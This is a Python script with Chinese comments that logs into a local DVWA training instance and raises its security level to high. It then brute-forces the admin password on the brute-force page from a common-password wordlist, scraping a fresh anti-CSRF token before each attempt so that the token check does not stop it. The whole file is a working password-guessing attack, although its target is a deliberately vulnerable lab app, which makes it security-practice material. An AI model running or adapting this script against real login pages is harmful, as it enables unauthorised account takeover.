import requests
import re
#登录获取cookie
sess=requests.session()
url='http://192.168.1.128/dvwa/login.php'
text=sess.get(url).text
pattern=re.compile(r'user_token\' value=\'.*\' />')
token=''.join(pattern.findall(text))
token=token.replace('user_token\' value=\'','')
token=token.replace('\' />','')
data={
    'username':'admin',
    'password':'password',
    'Login':'Login',
    'user_token':token
    }
result=sess.post('http://192.168.1.128/dvwa/login.php',data)
print("登陆成功")

#更改安全性为高
text=sess.get('http://192.168.1.128/dvwa/security.php').text
pattern=re.compile(r'user_token\' value=\'.*\' />')
token=''.join(pattern.findall(text))
token=token.replace('user_token\' value=\'','')
token=token.replace('\' />','')
data={
'security':'high',
'seclev_submit':'Submit',
'user_token':token
    }
result=sess.post('http://192.168.1.128/dvwa/security.php',data)
print('安全性更改为高')

#获取token
text=sess.get('http://192.168.1.128/dvwa/vulnerabilities/brute/').text
pattern=re.compile(r'user_token\' value=\'.*\' />')
token=''.join(pattern.findall(text))
token=token.replace('user_token\' value=\'','')
token=token.replace('\' />','')


#爆破密码
with open('G:\网络安全\资源\猪猪侠字典\Blasting_dictionary\常用密码.txt','r',encoding='utf-8') as f:
    while True:
        password=f.readline().replace('\n','')
        print(password,token)
        text=sess.get('http://192.168.1.128/dvwa/vulnerabilities/brute/index.php?username=admin&password='+password+'&Login=Login&user_token='+token).text
        if 'Welcome' in text:
            print("password found:",end='')
            print(password)
            break
        pattern=re.compile(r'user_token\' value=\'.*\' />')
        token=''.join(pattern.findall(text))
        token=token.replace('user_token\' value=\'','')
        token=token.replace('\' />','')

